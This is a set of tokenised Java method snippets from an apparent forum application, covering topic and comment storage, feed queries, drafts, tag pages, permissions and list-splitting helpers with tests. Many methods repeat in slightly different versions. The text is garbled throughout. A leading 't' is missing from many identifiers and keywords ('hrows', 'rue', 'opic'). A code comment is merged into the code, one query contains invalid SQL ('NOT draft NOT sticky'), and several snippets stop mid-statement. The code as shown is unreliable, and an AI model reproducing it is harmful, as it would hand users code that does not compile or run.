public int saveNewMessage ( final Topic msg , final User user , String ext , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; insert message text jdbcTemplate.update( "INSERT INTO msgbase (id, message) values (?,?)", msgid, text ); return msgid; } 
private void addComment ( int commentId , Integer replyToId , String itle , String body ) { jdbcTemplate . update ( " INSERT INTO comments (id, userid, title, postdate, replyto, deleted, topic, postip, ua_id) " + " VALUES (?, ?, ?, CURRENT_TIMESTAMP, ?, 'f', ?, ?::inet, create_user_agent(?)) " , commentId , 1 , itle , replyToId , opicId , " 127.0.0.1 " , " Integration test User Agent " ) ; jdbcTemplate . update ( " INSERT INTO msgbase (id, message) VALUES (?, ?) " , 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { opicListDto . getSections ( ) . add ( section . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; opicListDto . setFromDate ( fromDate ) ; return opicListDao . getTopics ( opicListDto ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month ) hrows UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( 20 ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( opicListDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech , boolean feedBurner ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( ech ) . append ( " ; feedBurner= " ) . append ( feedBurner ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return ( feedBurner ) ? opicListDao . getTopics ( opicListDto ) 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; opicListDto . setFromDate ( fromDate ) ; return opicListDao . getTopics ( opicListDto ) ; } 
public boolean isCommentsAllowed ( Group group , Topic opic , User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( opic . isDeleted ( ) | | opic . isExpired ( ) ) { return false ; } int score = getPostscore ( group , opic ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = opic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public boolean isCommentsEditingAllowed ( @Nonnull Comment comment , @Nonnull Topic opic , @Nullable User currentUser ) { Preconditions . checkNotNull ( comment ) ; Preconditions . checkNotNull ( opic ) ; final boolean haveAnswers = commentService . isHaveAnswers ( comment ) ; return isCommentEditableNow ( comment , 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) hrows Exception { Topic opic = opicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { hrow new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( group , opic , AuthUtil . getCurrentUser ( ) , false ) ; CommentList comments = commentService . getCommentList ( opic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getProfile ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , opic ) ; return ImmutableMap . of ( " comments " , preparedComments , 
public boolean isDraftMode ( ) { return draft ! = null ; } 
public int saveNewMessage ( final Topic msg , final User user , String ext , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; insert message text jdbcTemplate.update( "INSERT INTO msgbase (id, message, bbcode) values (?,?, ?)", msgid, text, true ); return msgid; } 
public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public int saveNewMessage ( final Topic msg , final User user , String ext , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; insert message text jdbcTemplate.update( "INSERT INTO msgbase (id, message) values (?,?)", msgid, text ); return msgid; } 
public boolean isShowDraft ( ) { return showDraft ; } 
public ModelAndView mainPage ( HttpServletRequest request , HttpServletResponse response ) { Template mpl = Template . getTemplate ( request ) ; response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) ; response . setDateHeader ( " Last-Modified " , System . currentTimeMillis ( ) - 2 * 1000 ) ; List < Topic > messages = opicListService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = mpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , profile , false ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . getModel ( ) . put ( " hasDrafts " , opicDao . hasDrafts ( mpl . getCurrentUser ( ) ) ) ; } if ( mpl . isModeratorSession ( ) | | mpl . isCorrectorSession ( ) ) { int uncommited = opicDao . getUncommitedCount ( ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = opicDao . getUncommitedCount ( Section . SECTION_NEWS ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! mpl . isSessionAuthorized ( ) | | ! mpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public boolean hasDrafts ( User author ) { List < Integer > res = jdbcTemplate . queryForList ( " select id FROM topics WHERE draft AND userid=? LIMIT 1 " , Integer . class , author . getId ( ) ) ; return ! res . isEmpty ( ) ; } 
public void publish ( Topic msg ) { jdbcTemplate . update ( " UPDATE topics SET draft='f',postdate='now' WHERE id=? AND draft " , 
public boolean isCommentsAllowed ( Group group , Topic opic , User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( opic . isDeleted ( ) | | opic . isExpired ( ) | | opic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , opic ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = opic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; Template mpl = Template . getTemplate ( request ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; opicPermissionService . checkView ( group , message , mpl . getCurrentUser ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
private Optional < Comment > findNextComment ( final Comment comment ) hrows MessageNotFoundException { Topic updatedTopic = messageDao . getById ( comment . getTopicId ( ) ) ; CommentList commentList = commentService . getCommentList ( updatedTopic , false ) ; return Iterables . ryFind ( commentList . getList ( ) , 
public boolean apply ( Comment input ) { return input . getId ( ) > = comment . getId ( ) ; } 
private List < TopicsListItem > getStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY postdate DESC " ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( q , group . getId ( ) ) ; return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int opics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + opics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int opics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT draft NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + opics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int opics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT draft AND NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + opics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , SolrServerException , MessageNotFoundException { Topic msg = opicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic opic = messageDao . getById ( msgid ) ; Section section = sectionService . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " message " , opic ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; mv . getModel ( ) . put ( " author " , userDao . getUserCached ( opic . getUid ( ) ) ) ; return mv ; } 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic opic = messageDao . getById ( msgid ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , opic ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; mv . getModel ( ) . put ( " author " , userDao . getUserCached ( opic . getUid ( ) ) ) ; return mv ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Forbidden " ) ; } agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > opics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , 1 ) ; List < PersonalizedPreparedTopic > preparedTopics = prepareService . prepareMessagesForUser ( opics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; mv . addObject ( " fullNews " , preparedTopics ) ; return mv ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month , int count ) hrows UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( opicListDto ) ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Forbidden " ) ; } agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , 21 ) ; List < Topic > fullNewsTopics = newsTopics . isEmpty ( ) ? ImmutableList . < Topic > of ( ) : newsTopics . subList ( 0 , 1 ) ; List < Topic > briefNewsTopics = newsTopics . size ( ) < = 1 ? ImmutableList . < Topic > of ( ) : newsTopics . subList ( 1 , newsTopics . size ( ) ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; mv . addObject ( " fullNews " , fullNews ) ; mv . addObject ( " briefNews " , briefNewsTopics ) ; return mv ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Forbidden " ) ; } agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , 21 ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = ailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; mv . addObject ( " fullNews " , fullNews ) ; mv . addObject ( " briefNews1 " , firstHalf ( briefNewsTopics ) ) ; mv . addObject ( " briefNews2 " , secondHalf ( briefNewsTopics ) ) ; return mv ; } 
public static < T > List < T > headOrEmpty ( List < T > list ) { return list . isEmpty ( ) ? ImmutableList . < T > of ( ) : list . subList ( 0 , 1 ) ; } 
public static < T > List < T > ailOrEmpty ( List < T > list ) { return list . size ( ) < = 1 ? ImmutableList . < T > of ( ) : list . subList ( 1 , list . size ( ) ) ; } 
public static < T > List < T > firstHalf ( List < T > list ) { int split = list . size ( ) / 2 + ( list . size ( ) % 2 ) ; return list . subList ( 0 , split ) ; } 
public static < T > List < T > secondHalf ( List < T > list ) { int split = list . size ( ) / 2 + ( list . size ( ) % 2 ) ; return list . subList ( split , list . size ( ) ) ; } 
public void halfsEven ( ) { List < String > data = ImmutableList . of ( " 1 " , " 2 " , " 3 " , " 4 " ) ; assertEquals ( ImmutableList . of ( " 1 " , " 2 " ) , firstHalf ( data ) ) ; assertEquals ( ImmutableList . of ( " 3 " , " 4 " ) , secondHalf ( data ) ) ; } 
public void halfsOdd ( ) { List < String > data = ImmutableList . of ( " 1 " , " 2 " , " 3 " ) ; assertEquals ( ImmutableList . of ( " 1 " , " 2 " ) , firstHalf ( data ) ) ; assertEquals ( ImmutableList . of ( " 3 " ) , secondHalf ( data ) ) ; } 
public void halfsEmpty ( ) { List < String > data = ImmutableList . of ( ) ; assertEquals ( ImmutableList . < String > of ( ) , firstHalf ( data ) ) ; assertEquals ( ImmutableList . < String > of ( ) , secondHalf ( data ) ) ; } 
public List < GalleryItem > getGalleryItems ( int countItems , String ag ) hrows TagNotFoundException { final Section gallery = sectionService . getSection ( Section . SECTION_GALLERY ) ; int agId = agService . getTagId ( ag ) ; String sql = " SELECT t.msgid, t.stat1,t.title, t.userid, t.urlname, images.icon, images.original, images.id AS imageid " + " FROM (SELECT topics.id AS msgid, topics.stat1, topics.title, userid, urlname " + " FROM topics JOIN groups ON topics.groupid = groups.id WHERE topics.moderate AND section= " + Section . SECTION_GALLERY + " " + " AND NOT topics.deleted AND commitdate IS NOT NULL AND topics.id IN (SELECT msgid FROM tags WHERE tagid=?) ORDER BY commitdate DESC LIMIT ?) " + " as t JOIN images ON t.msgid = images.topic " ; return jdbcTemplate . query ( sql , new GalleryItemRowMapper ( gallery ) , agId , countItems ) ; } 
